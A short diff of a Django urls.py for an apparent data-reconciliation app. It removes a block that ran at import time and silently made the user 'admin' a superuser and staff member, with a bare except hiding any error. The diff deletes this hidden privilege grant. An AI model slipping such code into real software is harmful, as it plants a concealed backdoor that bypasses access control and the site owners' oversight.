@@ -1,7 +1,6 @@
 from django.contrib import admin
 from django.urls import path
 from django.contrib.auth import views as auth_views
-from django.contrib.auth import get_user_model
 from core.views import (
     project_list, create_project, 
     upload_file, reconcile_now, reconciliation_report, 
@@ -32,13 +31,3 @@ urlpatterns = [
     path('project/<int:project_id>/reset/', reset_data, name='reset_data'),
     path('project/<int:project_id>/delete/', delete_project, name='delete_project'),
 ]
-
-User = get_user_model()
-
-try:
-    user = User.objects.get(username="admin")  
-    user.is_superuser = True
-    user.is_staff = True
-    user.save()
-except:
-    pass
